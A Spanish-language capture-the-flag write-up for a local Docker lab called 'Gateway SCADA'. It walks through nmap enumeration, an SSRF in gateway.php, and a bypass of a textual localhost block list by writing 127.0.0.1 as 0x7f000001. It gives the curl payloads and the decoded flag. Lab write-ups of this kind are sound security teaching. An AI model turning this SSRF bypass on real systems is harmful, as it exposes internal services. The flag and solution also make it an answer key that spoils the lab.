# Gateway SCADA

> Gateway de consulta de telemetría. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh && ./startlab.sh blackout-web06.tar` → IP del lab (172.18.0.2). Enumera con nmap y ataca por HTTP.
>
> **Consejo:** enumera la IP del lab con nmap. Hay un gateway que consulta la URL de un nodo.

**Flag:** `WHOAMI{ssrf_pl4nt4_n0rt3}`

---

## Resolución

### 1. Levantar y enumerar

**Herramienta:** `docker inspect` + `nmap`. **Por qué:** obtengo la IP del contenedor y luego los servicios a los que atacar.

**Parámetros de nmap:** `-sV` (versión del servicio) y `-p-` (todos los puertos).

```bash
$ unzip blackout-web06.zip && chmod +x startlab.sh && ./startlab.sh blackout-web06.tar
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web06
172.17.0.2

$ nmap -sV -p- 172.17.0.2
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Solo el puerto 80 → el ataque es por HTTP.

### 2. El gateway: campo "URL del nodo"

`/gateway.php` pide una URL y la previsualiza. El código hace `curl_init($url)` y vuelca la respuesta → **SSRF**. Bloquea `localhost`, `127.`, `0.0.0.0`, `::1`, `169.254`, `file:`, `gopher:`, `dict:`, `ftp:` — pero solo textualmente.

### 3. Bypass del bloqueo de localhost

`127.0.0.1` está bloqueado por el regex, pero **`0x7f000001` también resuelve a 127.0.0.1** y no contiene ninguna de las cadenas prohibidas:

```bash
$ curl -X POST http://172.17.0.2/gateway.php \
    --data-urlencode "url=http://0x7f000001:9090/"
{"nodo":"norte","sector":14,"kv":230}
```

**Lo que vi:** respondió un servicio interno en el puerto 9090 del propio contenedor (un mini servidor HTTP). Escaneando puertos dentro del contenedor (`netstat`) se ve: `0100007F:2382` = `127.0.0.1:9090`.

### 4. Descubrir las rutas del servicio interno

Probando rutas, `/registro` devuelve el contenido que buscamos:

```bash
$ curl -X POST http://172.17.0.2/gateway.php \
    --data-urlencode "url=http://0x7f000001:9090/registro"
ZKRDPL{vvui_so4qw4_q0uw3}
```

La cadena parece ROT/Caesar. `ZKRDPL` con desplazamiento **−3** = `WHOAMI`.

### 5. Decodificar el Caesar

**Herramienta:** `tr`. **Por qué:** reemplaza caracteres por rangos; sirve para aplicar el desplazamiento Caesar sin escribir código.

**Parámetros:** `'A-Za-z' 'X-ZA-Wx-za-w'` desplaza cada letra 3 posiciones hacia atrás (A→X, B→Y, …, Z→W).

```bash
$ echo "ZKRDPL{vvui_so4qw4_q0uw3}" | tr 'A-Za-z' 'X-ZA-Wx-za-w'
WHOAMI{ssrf_pl4nt4_n0rt3}
```

> **Nota anti-trampa:** el binario interno `/sbin/sys-daemon` contiene otra cadena `WHOAMI{docker_exec_detected_n1ce_try}` — es un **honeypot** para quien haga `docker exec cat /root/flag.txt` en vez de resolver el SSRF. La flag real solo sale por el servicio interno.

## Lección

El SSRF con bloqueo de `localhost` no protege nada: se bypasea con representaciones alternas de la IP (`0x7f000001`, decimal, octal…). Luego explora puertos internos y rutas del servicio alcanzado. Y ojo con las cadenas trampa en los binarios del contenedor.